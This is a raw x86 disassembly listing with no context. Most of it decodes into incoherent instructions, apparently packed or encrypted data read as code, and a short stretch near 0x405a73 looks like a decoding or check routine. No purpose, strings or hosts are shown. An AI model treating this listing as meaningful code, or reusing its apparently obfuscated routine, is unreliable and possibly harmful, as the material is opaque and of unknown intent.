  405660:	ret    0x7e64
  405663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405664:	dec    ebx
  405665:	push   esp
  405666:	retf   0xaa02
  405669:	push   0x8f12c942
  40566e:	or     eax,DWORD PTR [ebp-0xb]
  405671:	(bad)  
  405672:	pop    ebp
  405673:	pop    ss
  405674:	mov    ebx,0x63ceb5a3
  405679:	fs sahf 
  40567b:	adc    BYTE PTR [eax],cl
  40567d:	push   0x4193c134
  405682:	fsub   QWORD PTR [esp+ecx*8]
  405685:	stos   BYTE PTR es:[edi],al
  405686:	stos   BYTE PTR es:[edi],al
  405687:	into   
  405688:	xor    eax,0x78d2933a
  40568d:	push   0xffffff82
  40568f:	and    eax,0x2f306e8e
  405694:	xor    eax,0xdd293d29
  405699:	push   ebx
  40569a:	inc    eax
  40569b:	dec    ebx
  40569c:	aaa    
  40569d:	push   esi
  40569e:	dec    esp
  40569f:	and    BYTE PTR [ecx+esi*8+0x7c],bl
  4056a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056a4:	mov    al,bl
  4056a6:	xchg   edx,eax
  4056a7:	lea    edx,[edx-0xb160b47]
  4056ad:	mov    ebx,0x3e72f8f8
  4056b2:	loopne 0x405717
  4056b4:	and    DWORD PTR [edi],eax
  4056b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056b7:	jge    0x405680
  4056b9:	scas   eax,DWORD PTR es:[edi]
  4056ba:	les    edi,FWORD PTR [edi]
  4056bc:	mov    DWORD PTR [eax+0x4e],edi
  4056bf:	sbb    al,0x4
  4056c1:	push   eax
  4056c2:	fsub   DWORD PTR [ecx]
  4056c4:	aad    0x5a
  4056c6:	jae    0x4056b9
  4056c8:	xor    eax,edi
  4056ca:	or     eax,edx
  4056cc:	mov    edx,DWORD PTR [ebp-0x4]
  4056cf:	dec    eax
  4056d0:	not    eax
  4056d2:	jmp    0x405a73
  4056d7:	int    0x14
  4056d9:	mov    ds:0x7ab8a317,eax
  4056de:	sbb    al,0x97
  4056e0:	mov    ah,0x18
  4056e2:	shr    DWORD PTR [ebx+0x9],1
  4056e5:	push   0xbe1fbed1
  4056ea:	mov    esi,0xbebec4bd
  4056ef:	sahf   
  4056f0:	retf   0xd961
  4056f3:	inc    ebp
  4056f4:	dec    ecx
  4056f5:	test   BYTE PTR [edx+eiz*4+0x533b0771],bh
  4056fc:	pop    edi
  4056fd:	test   al,ch
  4056ff:	xchg   ebx,eax
  405700:	inc    esp
  405701:	pop    eax
  405702:	std    
  405703:	mov    bh,0xd
  405705:	cmp    esi,DWORD PTR [edi-0x32]
  405708:	lods   al,BYTE PTR ds:[si]
  40570a:	or     BYTE PTR [esi+0x7957900f],bl
  405710:	cs cli 
  405712:	pushf  
  405713:	dec    ebp
  405714:	push   0x10
  405716:	ds push edi
  405718:	jno    0x40572a
  40571a:	xor    ebx,0x5b2b77ba
  405720:	out    0x6e,eax
  405722:	adc    eax,DWORD PTR [esi]
  405724:	xor    esp,DWORD PTR [ebp-0x6b]
  405727:	(bad)  
  405728:	aam    0xfa
  40572a:	mov    ecx,0x5351fcb8
  40572f:	adc    al,0x2f
  405731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405732:	cli    
  405733:	cmc    
  405734:	pop    esi
  405735:	cmp    ebp,DWORD PTR [edi+0x3619a2ec]
  40573b:	pop    ss
  40573c:	pop    ecx
  40573d:	xor    eax,0x686bd0e3
  405742:	xchg   esi,eax
  405743:	pop    edx
  405744:	jns    0x40575d
  405746:	cmc    
  405747:	ffree  st(3)
  405749:	and    DWORD PTR [edx+eiz*2],0x70
  40574d:	cmp    DWORD PTR [esi+0x69],edx
  405750:	out    dx,eax
  405751:	sub    DWORD PTR [ecx],0xcd0fd91f
  405757:	lea    edx,[ebx]
  405759:	mov    dl,cl
  40575b:	aaa    
  40575c:	sbb    eax,0xc5c424ac
  405761:	jl     0x405701
  405763:	sbb    edi,edx
  405765:	scas   al,BYTE PTR es:[edi]
  405766:	adc    eax,0x445415b
  40576b:	mov    ecx,0x2fc762b6
  405770:	jbe    0x4057a9
  405772:	mov    ah,0xbd
  405774:	out    dx,al
  405775:	inc    esp
  405776:	mov    DWORD PTR [edi+0x1f],ecx
  405779:	stos   DWORD PTR es:[edi],eax
  40577a:	mov    DWORD PTR [ecx-0x66],ebx
  40577d:	mov    al,0x92
  40577f:	shl    DWORD PTR [edi-0x779aa362],1
  405785:	push   0x5e
  405787:	mov    ecx,0xa23b3909
  40578c:	dec    ecx
  40578d:	cli    
  40578e:	push   esp
  40578f:	(bad)  
  405790:	cli    
  405791:	aad    0xd3
  405793:	loopne 0x4057c0
  405795:	xchg   BYTE PTR [ebx+0x3d6ac5cc],dl
  40579b:	lds    ebx,FWORD PTR ds:0xfe058908
  4057a1:	pop    edi
  4057a2:	test   DWORD PTR [edi+0x540b4b1e],0xaa78fa50
  4057ac:	lods   eax,DWORD PTR ds:[esi]
  4057ad:	jnp    0x4057e3
  4057af:	data16 jge 0x405763
  4057b2:	test   DWORD PTR [eax],eax
  4057b4:	sahf   
  4057b5:	dec    eax
  4057b6:	mov    eax,edi
  4057b8:	in     eax,dx
  4057b9:	jge    0x4057d3
  4057bb:	pop    es
  4057bc:	ret    
  4057bd:	inc    eax
  4057be:	mov    cl,0xf
  4057c0:	ret    
  4057c1:	push   0xffffffff
  4057c3:	in     eax,dx
  4057c4:	pop    ebx
  4057c5:	call   ecx
  4057c7:	jp     0x40578a
  4057c9:	outs   dx,DWORD PTR ds:[esi]
  4057ca:	add    eax,0x1bcb7a91
  4057cf:	fild   DWORD PTR [edx+ebp*2]
  4057d2:	xor    DWORD PTR [esi+0xfb1cf35],ebx
  4057d8:	pop    edi
  4057d9:	repz cs xchg edi,eax
  4057dc:	test   DWORD PTR [edi+eax*4],eax
  4057df:	shr    edx,0xbb
  4057e2:	push   cs
  4057e3:	cli    
  4057e4:	lock ins BYTE PTR es:[edi],dx
  4057e6:	sub    esi,esp
  4057e8:	(bad)  
  4057e9:	out    dx,al
  4057ea:	adc    eax,0x8977fd30
  4057ef:	xor    BYTE PTR ds:0x2c5ad740,bh
  4057f5:	cmp    bl,bh
  4057f7:	outs   dx,BYTE PTR ds:[esi]
  4057f8:	and    al,0x42
  4057fa:	imul   esi,DWORD PTR [edi+0x28],0xbfe94172
  405801:	jbe    0x405882
  405803:	adc    esp,ecx
  405805:	pop    eax
  405806:	sar    esi,cl
  405808:	in     al,dx
  405809:	fdivr  st,st(0)
  40580b:	mov    edi,0x555653e3
  405810:	pushf  
  405811:	or     dl,BYTE PTR [ebx]
  405813:	sbb    esi,DWORD PTR [edx+0x4f]
  405816:	mov    ds:0x99646cd1,eax
  40581b:	(bad)  
  40581c:	hlt    
  40581d:	test   al,0x5c
  40581f:	cwde   
  405820:	sbb    edi,DWORD PTR [edi]
  405822:	jae    0x4058a0
  405824:	iret   
  405825:	sbb    DWORD PTR [edx-0x38bb8f28],0xffffffb2
  40582c:	jnp    0x405849
  40582e:	sub    cl,BYTE PTR [esi+0x57]
  405831:	and    BYTE PTR [edi+0x5fde4718],al
  405837:	mov    ebx,0x3747bb93
  40583c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40583d:	jae    0x4057d2
  40583f:	outs   dx,DWORD PTR ds:[esi]
  405840:	fadd   QWORD PTR [eax]
  405842:	fcmovnu st,st(3)
  405844:	jne    0x4058a7
  405846:	ja     0x405862
  405848:	das    
  405849:	mov    edx,DWORD PTR [edi-0x2a2e3bcc]
  40584f:	sahf   
  405850:	ret    0xbd8d
  405853:	sub    eax,0xb6a406d2
  405858:	mov    al,ds:0xffb96af2
  40585d:	add    BYTE PTR [ecx+eiz*1+0x52332045],0x7b
  405865:	sbb    DWORD PTR [ecx+0x11de1938],ebx
  40586b:	dec    eax
  40586c:	sub    esp,DWORD PTR [esi+esi*1]
  40586f:	imul   ebp,DWORD PTR [ecx-0xd],0xffffffab
  405873:	push   0x61f85f16
  405878:	pop    ebx
  405879:	or     ebx,DWORD PTR [eax-0x7e85e338]
  40587f:	jp     0x405884
  405881:	icebp  
  405882:	pop    ebp
  405883:	in     eax,dx
  405884:	xchg   ebx,eax
  405885:	dec    ecx
  405886:	test   eax,0x86dc829d
  40588b:	(bad)  
  40588c:	cmp    edi,DWORD PTR [esi+0x6c706e81]
  405892:	xor    al,0xa9
  405894:	adc    esp,DWORD PTR [edi]
  405896:	mov    ah,0xc7
  405898:	jmp    0x405843
  40589a:	mov    ah,0xd5
  40589c:	add    edi,DWORD PTR [ecx+edx*8-0x189ab164]
  4058a3:	das    
  4058a4:	loopne 0x4058c1
  4058a6:	push   ds
  4058a7:	inc    edi
  4058a8:	imul   edx,DWORD PTR [ecx+ecx*8],0xffffffea
  4058ac:	add    BYTE PTR [ebx+0x7ec123cd],al
  4058b2:	or     eax,0xbdf296a
  4058b7:	mov    al,0xe8
  4058b9:	outs   dx,BYTE PTR ds:[esi]
  4058ba:	outs   dx,BYTE PTR ds:[esi]
  4058bb:	and    bl,BYTE PTR [edi-0x42]
  4058be:	push   es
  4058bf:	aad    0xd6
  4058c1:	inc    ebx
  4058c2:	pop    esi
  4058c3:	pop    ebx
  4058c4:	jecxz  0x4058fc
  4058c6:	in     al,dx
  4058c7:	mov    esi,0xe9cb5d1f
  4058cc:	jmp    0x405885
  4058ce:	inc    edi
  4058cf:	and    al,0xf6
  4058d1:	fdivr  DWORD PTR [eax-0x71]
  4058d4:	pop    esp
  4058d5:	stc    
  4058d6:	sub    al,0x6a
  4058d8:	pop    ds
  4058d9:	mov    ch,0xa5
  4058db:	jecxz  0x4058cc
  4058dd:	add    bl,ch
  4058df:	pop    esi
  4058e0:	xchg   ecx,edi
  4058e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058e3:	pop    ebx
  4058e4:	mov    BYTE PTR [ecx+0x61ea08fa],0x49
  4058eb:	push   eax
  4058ec:	mov    eax,0x52cab036
  4058f1:	xchg   ecx,eax
  4058f2:	clc    
  4058f3:	pop    edx
  4058f4:	mov    WORD PTR [edi-0x1b],?
  4058f7:	pop    ss
  4058f8:	cs call DWORD PTR es:[ebx+0x748c77f5]
  405900:	cmp    ebp,DWORD PTR [esi-0x215a2d2a]
  405906:	clc    
  405907:	pop    ds
  405908:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405909:	add    eax,0xfaf70997
  40590e:	push   ds
  40590f:	dec    esp
  405910:	cmp    BYTE PTR [edx-0x4ac34e25],bh
  405916:	push   0xffffff9e
  405918:	sti    
  405919:	ds sub ebx,ecx
  40591c:	out    0xf3,al
  40591e:	fwait
  40591f:	xchg   ecx,eax
  405920:	lods   al,BYTE PTR ds:[esi]
  405921:	call   0x6f7d:0xec6036ce
  405928:	jmp    0xc212:0x2fe8aaf4
  40592f:	mov    bh,0xa8
  405931:	jg     0x405934
  405933:	add    dl,bl
  405935:	xor    bl,BYTE PTR [edx+ecx*1-0x4e]
  405939:	test   eax,0x48f12b09
  40593e:	out    0x3c,al
  405940:	ds das 
  405942:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405943:	lock not DWORD PTR [edx-0x3b]
  405947:	xchg   BYTE PTR [eax+0x2c],dh
  40594a:	clc    
  40594b:	in     al,dx
  40594c:	fst    QWORD PTR ds:0x47914625
  405952:	mov    cl,0x8d
  405954:	adc    eax,0x913e41cd
  405959:	jae    0x4058e9
  40595b:	iret   
  40595c:	jl     0x4058ee
  40595e:	lahf   
  40595f:	mov    esp,0xc1338caf
  405964:	adc    edx,edi
  405966:	popa   
  405967:	retf   0x8f0d
  40596a:	ss hlt 
  40596c:	mov    al,ds:0x4948aa76
  405971:	jmp    0x3d93:0x89996c37
  405978:	hlt    
  405979:	retf   
  40597a:	ins    DWORD PTR es:[edi],dx
  40597b:	inc    ebx
  40597c:	pminub mm3,QWORD PTR [eax]
  40597f:	mov    dl,0x42
  405981:	adc    ecx,0xffffffe9
  405984:	and    ebx,DWORD PTR [edi+0x4f]
  405987:	xor    eax,DWORD PTR [esi-0x712a7ef1]
  40598d:	sbb    edx,ebx
  40598f:	out    dx,al
  405990:	daa    
  405991:	or     BYTE PTR [esi],dl
  405993:	test   BYTE PTR [edx-0x4a6c57d1],al
  405999:	mov    ecx,0x9ef219fe
  40599e:	xor    BYTE PTR ds:0xd0a733ba,bh
  4059a4:	cld    
  4059a5:	pushf  
  4059a6:	push   eax
  4059a7:	jb     0x405a18
  4059a9:	xor    eax,0xbdcea416
  4059ae:	fiadd  WORD PTR [ebx]
  4059b0:	ror    DWORD PTR ss:[eax],1
  4059b3:	xor    DWORD PTR [edx+0x148cc583],eax
  4059b9:	scas   al,BYTE PTR es:[edi]
  4059ba:	jl     0x40596e
  4059bc:	lea    eax,[esi+0x6fa32c8e]
  4059c2:	addr16 sub ecx,ebx
  4059c5:	shrd   DWORD PTR [eax+eiz*2+0x3862259],edi,cl
  4059cd:	shl    BYTE PTR [esi],1
  4059cf:	cmp    dl,cl
  4059d1:	pop    es
  4059d2:	pop    ds
  4059d3:	(bad)  
  4059d4:	aas    
  4059d5:	mov    esp,0xa32a6f48
  4059da:	stos   BYTE PTR es:[edi],al
  4059db:	mov    bh,0x6b
  4059dd:	jns    0x405a39
  4059df:	clc    
  4059e0:	int3   
  4059e1:	push   ebx
  4059e2:	loope  0x4059b9
  4059e4:	sbb    DWORD PTR [ecx-0x10632913],0x76
  4059eb:	dec    edx
  4059ec:	sbb    bh,BYTE PTR [ebp+0x4c6daa07]
  4059f2:	mov    bh,0x9e
  4059f4:	inc    esp
  4059f5:	xchg   DWORD PTR [edi-0x176028f4],esi
  4059fb:	ins    BYTE PTR es:[edi],dx
  4059fc:	sbb    ah,ah
  4059fe:	xchg   ebx,eax
  4059ff:	bound  edi,QWORD PTR [eax+edx*2-0x6aa19fdd]
  405a06:	mov    dh,0xe3
  405a08:	mov    DWORD PTR [edx-0x225ea831],esi
  405a0e:	(bad)  
  405a0f:	or     eax,0x1917e934
  405a14:	stos   DWORD PTR es:[edi],eax
  405a15:	aaa    
  405a16:	fs (bad) 
  405a18:	xor    eax,0x1d2a0285
  405a1d:	and    edx,DWORD PTR [esi]
  405a1f:	jl     0x405a82
  405a21:	mov    esp,0x186b5e9d
  405a26:	iret   
  405a27:	xor    ch,cl
  405a29:	add    edx,ecx
  405a2b:	ficom  DWORD PTR [ecx+edx*1+0x7]
  405a2f:	(bad)  
  405a30:	push   eax
  405a31:	loopne 0x405a70
  405a33:	jg     0x4059e3
  405a35:	test   ecx,edx
  405a37:	out    0x8e,eax
  405a39:	scas   al,BYTE PTR es:[edi]
  405a3a:	or     dh,ch
  405a3c:	pop    es
  405a3d:	push   cs
  405a3e:	push   ds
  405a3f:	mov    ebp,0xb408be0e
  405a44:	dec    edx
  405a45:	out    0x33,eax
  405a47:	scas   eax,DWORD PTR es:[edi]
  405a48:	sub    BYTE PTR [ebx],bh
  405a4a:	pop    esp
  405a4b:	mov    BYTE PTR [ebp+0x4496ba72],dh
  405a51:	adc    DWORD PTR [esi+0x66],0x4f17de0e
  405a58:	jnp    0x405aa9
  405a5a:	cmp    DWORD PTR [eax],esp
  405a5c:	fcmove st,st(4)
  405a5e:	mov    esi,0xb5ee8466
  405a63:	stc    
  405a64:	sub    DWORD PTR [ecx],ecx
  405a66:	cs daa 
  405a68:	hlt    
  405a69:	std    
  405a6a:	and    DWORD PTR ds:0xf5c7108,0xffffffdd
  405a71:	jp     0x405a4f
  405a73:	and    eax,edx
  405a75:	xor    ecx,edi
  405a77:	mov    DWORD PTR [ebp-0x4],eax
  405a7a:	mov    DWORD PTR [ebp+0x14],ecx
  405a7d:	xor    eax,eax
  405a7f:	or     DWORD PTR [ebp+0x14],eax
  405a82:	mov    eax,DWORD PTR [ebp-0x50]
  405a85:	mov    ecx,DWORD PTR [ebp-0x4c]
  405a88:	shrd   eax,ecx,0x2
  405a8c:	shr    ecx,0x2
  405a8f:	mov    cx,ax
  405a92:	mov    eax,DWORD PTR [ebp-0x50]
  405a95:	mov    edx,0x6d5d
  405a9a:	xor    cx,dx
  405a9d:	mov    edx,DWORD PTR [ebp-0x4c]
  405aa0:	xor    edx,edx
  405aa2:	shl    eax,0x1e
  405aa5:	mov    ax,dx
  405aa8:	or     ax,cx
  405aab:	mov    ecx,DWORD PTR [ebp-0x4]
  405aae:	cmp    WORD PTR [ecx],ax
  405ab1:	je     0x406288
  405ab7:	mov    eax,DWORD PTR [ebp+0x14]
  405aba:	sub    DWORD PTR [ebp-0x4],eax
  405abd:	mov    eax,DWORD PTR [esi]
  405abf:	jmp    0x405e60
  405ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ac5:	test   eax,0x3c522b52
  405aca:	mov    eax,0x46ddf0ac
  405acf:	xchg   edx,eax
  405ad0:	xor    eax,0xbda4ba12
  405ad5:	and    eax,0xc4bdbebe
  405ada:	mov    esi,0xb62b77be
  405adf:	xchg   ecx,eax
  405ae0:	cmp    eax,0xf8d277a7
  405ae5:	adc    DWORD PTR [ebp+0x45],ebp
  405ae8:	cmp    esi,edx
  405aea:	add    ecx,DWORD PTR [esi-0x66]
  405aed:	xchg   DWORD PTR [ebp+0x494e365b],ecx
  405af3:	push   esi
  405af4:	lahf   
  405af5:	ins    DWORD PTR es:[edi],dx
  405af6:	inc    ebx
  405af7:	into   
  405af8:	cmp    al,0x62
  405afa:	out    dx,eax
  405afb:	test   cl,al
  405afd:	xor    al,0xd
  405aff:	cld    
  405b00:	or     ebx,DWORD PTR [esi+0x5c]
  405b03:	add    al,BYTE PTR [edi-0x14be9304]
  405b09:	fst    DWORD PTR [ecx+0x38]
  405b0c:	push   edi
  405b0d:	push   0xd637cee5
  405b12:	fs mov ah,0xfa
  405b15:	xor    ecx,esi
  405b17:	adc    ebp,DWORD PTR [ecx]
  405b19:	ins    BYTE PTR es:[edi],dx
  405b1a:	bound  edx,QWORD PTR [ecx]
  405b1c:	lock (bad) 
  405b1f:	hlt    
  405b20:	rcr    DWORD PTR [eax],1
  405b22:	clc    
  405b23:	xchg   esp,eax
  405b24:	jns    0x405b11
  405b26:	mov    al,ds:0xf50a14d2
  405b2b:	ret    0xa010
  405b2e:	pushf  
  405b2f:	sub    DWORD PTR ds:0x75928239,eax
  405b35:	outs   dx,BYTE PTR ds:[esi]
  405b36:	shr    BYTE PTR [ebp-0x6b],0x6e
  405b3a:	xchg   edi,eax
  405b3b:	jne    0x405ba6
  405b3d:	push   ebx
  405b3e:	in     eax,dx
  405b3f:	out    dx,al
  405b40:	jp     0x405b5d
  405b42:	sub    ecx,ebp
  405b44:	push   ebp
  405b45:	je     0x405af1
  405b47:	mov    bh,BYTE PTR [ebx-0x33]
  405b4a:	xchg   ebx,eax
  405b4b:	sbb    DWORD PTR [edx],esp
  405b4d:	pop    ebx
  405b4e:	fisub  WORD PTR [edx+0x52]
  405b51:	imul   esi,DWORD PTR [ebx],0x26
  405b54:	(bad)  
  405b55:	inc    ebp
  405b56:	push   ds
  405b57:	and    ecx,DWORD PTR [esi]
  405b59:	(bad)  
  405b5b:	fsubr  DWORD PTR [ecx]
  405b5d:	fcom   QWORD PTR [edi+0x50]
  405b60:	outs   dx,DWORD PTR ds:[esi]
  405b61:	rol    DWORD PTR [edi],0x73
  405b64:	jg     0x405b01
  405b66:	repnz sbb esi,0xffffffc7
  405b6a:	fadd   DWORD PTR [edx+0x64]
  405b6d:	inc    ebx
  405b6e:	popa   
  405b6f:	pop    esi
  405b70:	bndstx [esi+0x2b],(bad)
  405b74:	rcl    cl,0xfb
  405b77:	xchg   edx,eax
  405b78:	not    DWORD PTR [edx+0x53]
  405b7b:	mov    esp,0xfb3385ed
  405b80:	inc    ebx
  405b81:	dec    eax
  405b82:	hlt    
  405b83:	cmp    ebp,DWORD PTR [esi+0x4c]
  405b86:	cmp    ch,bh
  405b88:	xchg   esi,eax
  405b89:	pop    ecx
  405b8a:	aad    0x44
  405b8c:	xchg   ebx,eax
  405b8d:	cdq    
  405b8e:	cmp    esp,edx
  405b90:	mov    bl,0xc2
  405b92:	in     al,0xfb
  405b94:	fistp  WORD PTR [esi-0x26]
  405b97:	jb     0x405b52
  405b99:	jae    0x405c19
  405b9b:	in     al,0x25
  405b9d:	mov    edi,0x379a873c
  405ba2:	mov    edx,ebp
  405ba4:	stc    
  405ba5:	inc    bl
  405ba7:	and    esi,DWORD PTR [edi]
  405ba9:	push   0xffffffce
  405bab:	aam    0xb4
  405bad:	int3   
  405bae:	xchg   ebx,eax
  405baf:	test   DWORD PTR [ebx-0x6cd62bc0],ebp
  405bb5:	jge    0x405ba5
  405bb7:	sbb    ah,BYTE PTR [edx+0xb]
  405bba:	dec    edx
  405bbb:	and    al,0x57
  405bbd:	dec    ebx
  405bbe:	jmp    0x38f48bbd
  405bc3:	jl     0x405ba3
  405bc5:	mov    DWORD PTR [esi+0x22228e78],ebp
  405bcb:	xchg   esi,eax
  405bcc:	ins    DWORD PTR es:[edi],dx
  405bcd:	aad    0xf1
  405bcf:	sub    DWORD PTR [esi+0x303dda5d],ecx
  405bd5:	call   DWORD PTR [ebx+eax*2-0x2cd2a2ab]
  405bdc:	dec    esi
  405bdd:	retf   
  405bde:	bound  edi,QWORD PTR [edi+edi*1+0x40]
  405be2:	push   cs
  405be3:	icebp  
  405be4:	test   al,0xfd
  405be6:	out    0x39,al
  405be8:	and    al,0xd0
  405beb:	rol    BYTE PTR [edi+0x6d],1
  405bee:	ss mov edi,ebx
  405bf1:	cli    
  405bf2:	test   eax,0x3b2298a8
  405bf7:	push   ebx
  405bf8:	fwait
  405bf9:	pop    ss
  405bfa:	fisub  DWORD PTR [eax+0x7e]
  405bfd:	jnp    0x405c6c
  405bff:	push   esp
  405c00:	push   ecx
  405c01:	daa    
  405c02:	loope  0x405c32
  405c04:	cld    
  405c05:	fcom   QWORD PTR [esi]
  405c07:	jmp    0xa2fdc5a3
  405c0c:	mov    ?,WORD PTR ds:0xb41a1e24
  405c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c13:	jns    0x405bd4
  405c15:	loope  0x405c3e
  405c17:	int    0x8c
  405c19:	mov    WORD PTR [esi-0x53bc7d35],fs
  405c1f:	mov    edi,0x5ed7967b
  405c24:	scas   eax,DWORD PTR es:[edi]
  405c25:	dec    esp
  405c26:	or     eax,0xf0f8a879
  405c2b:	ins    DWORD PTR es:[edi],dx
  405c2c:	mov    eax,0x5db2a7c5
  405c31:	xor    DWORD PTR [esi+0x54f4ae14],edx
  405c37:	pop    ebp
  405c38:	push   eax
  405c39:	cmp    al,0x34
  405c3b:	test   BYTE PTR [eax+esi*1+0x3000a96e],dh
  405c42:	mov    ah,0xab
  405c44:	sub    bl,BYTE PTR gs:[esi]
  405c47:	or     esp,DWORD PTR [ecx-0xf]
  405c4a:	mov    bh,0x9c
  405c4c:	jae    0x405cbd
  405c4e:	(bad)
  405c52:	xchg   BYTE PTR [ebp+0x7c],cl
  405c55:	cli    
  405c56:	xchg   esi,eax
  405c57:	ins    DWORD PTR es:[edi],dx
  405c58:	jge    0x405c8f
  405c5a:	iret   
  405c5b:	scas   eax,DWORD PTR es:[edi]
  405c5c:	shl    ecx,0x27
  405c5f:	shl    esi,0xce
  405c62:	test   DWORD PTR [ebx-0x4430e380],0xf18b98c3
  405c6c:	mov    ebx,0xf42b511e
  405c71:	aaa    
  405c72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c73:	mov    ds:0xc8d02e6d,al
  405c78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c79:	pop    esi
  405c7a:	pop    edi
  405c7b:	pop    edi
  405c7c:	add    DWORD PTR [eax+0x31416d5c],esp
  405c82:	call   0xd109:0xf8ebce1e
  405c89:	xor    al,0x1e
  405c8b:	cdq    
  405c8c:	loop   0x405caa
  405c8e:	adc    bl,bl
  405c90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c91:	arpl   WORD PTR [eax+esi*2-0xaf55bfe],ax
  405c98:	outs   dx,DWORD PTR ds:[esi]
  405c99:	int3   
  405c9a:	jno    0x405c2e
  405c9c:	jmp    0xcf6:0xd6ae71e3
  405ca3:	pusha  
  405ca4:	pop    ecx
  405ca5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ca6:	jns    0x405c96
  405ca8:	out    dx,al
  405ca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405caa:	fcomp  QWORD PTR [ebp-0x59d2616f]
  405cb0:	or     esp,DWORD PTR [eax+eax*4]
  405cb3:	pop    eax
  405cb4:	lods   al,BYTE PTR ds:[esi]
  405cb5:	ja     0x405ca6
  405cb7:	push   edx
  405cb8:	lahf   
  405cb9:	xor    eax,0x9d9a5fd0
  405cbe:	cmp    BYTE PTR ds:0xb6084cca,bh
  405cc4:	push   edi
  405cc5:	and    edx,0x5de544f2
  405ccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ccc:	daa    
  405ccd:	xchg   ecx,eax
  405cce:	aas    
  405ccf:	pusha  
  405cd0:	sbb    al,0x30
  405cd2:	adc    BYTE PTR [edi-0x7c7de7d9],dl
  405cd8:	mov    edx,0xb045fd36
  405cdd:	or     BYTE PTR [ebx],cl
  405cdf:	rol    esp,1
  405ce1:	sbb    al,0xd2
  405ce3:	xchg   ecx,eax
  405ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ce5:	or     edi,ecx
  405ce7:	outs   dx,DWORD PTR ds:[esi]
  405ce8:	call   0x30a993e8
  405ced:	cmp    al,0xe
  405cef:	inc    eax
  405cf0:	sub    al,0xa4
  405cf2:	mov    bl,0x1c
  405cf4:	dec    edx
  405cf5:	push   ss
  405cf6:	mov    ds:0xb73a3f3,al
  405cfb:	jp     0x405d38
  405cfd:	mov    bh,0xde
  405cff:	mov    esp,0x4e68224d
  405d04:	aad    0x3f
  405d06:	sbb    cl,bl
  405d08:	jmp    0x2c189aa4
  405d0d:	pop    ebx
  405d0e:	mov    bh,BYTE PTR [ebx+0x2b5bc87b]
  405d14:	test   eax,ebp
  405d16:	xchg   esi,eax
  405d17:	cmp    eax,0x789a993d
  405d1c:	jge    0x405cac
  405d1e:	icebp  
  405d1f:	ficom  DWORD PTR ds:0x98fe6e86
  405d25:	adc    DWORD PTR [ecx+0x23ef6626],esi
  405d2b:	into   
  405d2c:	hlt    
  405d2d:	mov    edx,0xfbc0615d
  405d32:	sub    BYTE PTR [edx-0x1ff164c5],bh
  405d38:	les    ebp,FWORD PTR [edi+0x1e519aa7]
  405d3e:	inc    ebp
  405d3f:	(bad)  
  405d40:	lods   eax,DWORD PTR ds:[esi]
  405d41:	arpl   sp,bx
  405d43:	jle    0x405ce7
  405d45:	movlps xmm6,QWORD PTR [ecx+0x77]
  405d49:	neg    DWORD PTR [edx-0x10]
  405d4c:	inc    edx
  405d4d:	psubusw mm4,QWORD PTR [ebx-0x2e]
  405d51:	inc    ebp
  405d52:	leave  
  405d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d54:	cmp    BYTE PTR [edx-0x1bf36efb],0xe6
  405d5b:	in     al,dx
  405d5c:	ins    BYTE PTR es:[edi],dx
  405d5d:	or     dh,BYTE PTR [esi-0x7ba496d3]
  405d63:	lds    ecx,FWORD PTR [ebx-0x541e4313]
  405d69:	jg     0x405dbf
  405d6b:	add    DWORD PTR ds:[edx],edx
  405d6e:	mov    bh,0xbd
  405d70:	in     eax,dx
  405d71:	fs out 0x7e,al
  405d74:	dec    ecx
  405d75:	sbb    BYTE PTR ds:0xe2b86fd1,cl
  405d7b:	je     0x405da6
  405d7d:	js     0x405de4
  405d7f:	mov    edx,0x62782adf
  405d84:	pop    ss
  405d85:	cwde   
  405d86:	outs   dx,DWORD PTR ds:[esi]
  405d87:	in     eax,dx
  405d88:	or     DWORD PTR [esi+0x7f9e8544],esp
  405d8e:	out    0x46,eax
  405d90:	mov    ecx,0x918efac4
  405d95:	mov    ?,WORD PTR [edx]
  405d97:	mov    ch,BYTE PTR [ebx-0x4629a889]
  405d9d:	inc    eax
  405d9e:	in     al,0x66
  405da0:	pop    ebx
  405da1:	adc    dl,ch
  405da3:	mov    esp,0xb2e9446
  405da8:	pushf  
  405da9:	loope  0x405d8a
  405dab:	jmp    0x49ec9ba4
  405db0:	dec    ebp
  405db1:	xchg   BYTE PTR [ebx-0x40d84aeb],ch
  405db7:	mov    bh,0x65
  405db9:	or     BYTE PTR [eax+0x71d93e22],0xca
  405dc0:	adc    ebp,DWORD PTR [ebx-0x5992249b]
  405dc6:	xchg   esi,eax
  405dc7:	fptan  
  405dc9:	dec    ebp
  405dca:	fcompp 
  405dcc:	xchg   ebp,eax
  405dcd:	dec    eax
  405dce:	sbb    al,0x11
  405dd0:	pop    ebx
  405dd1:	das    
  405dd2:	mov    bh,0xbc
  405dd4:	push   es
  405dd5:	mov    al,0x30
  405dd7:	out    0x73,al
  405dd9:	jmp    0x405ddd
  405ddb:	rep ins BYTE PTR es:[edi],dx
  405ddd:	cmp    eax,0xe52cc393
  405de2:	inc    esp
  405de3:	xchg   edx,eax
  405de4:	adc    cl,dl
  405de6:	cmp    al,0x37
  405de8:	dec    esi
  405de9:	dec    esi
  405dea:	inc    edi
  405deb:	mov    al,0x2
  405ded:	lock xor ecx,edi
  405df0:	test   eax,0xfefc4ac5
  405df5:	cs or  al,0x91
  405df8:	retf   
  405df9:	test   al,0xff
  405dfb:	jb     0x405e64
  405dfd:	mov    ah,BYTE PTR [eax+0x40]
  405e00:	arpl   WORD PTR [ebx+eax*1-0x2a0dc52],cx
  405e07:	cdq    
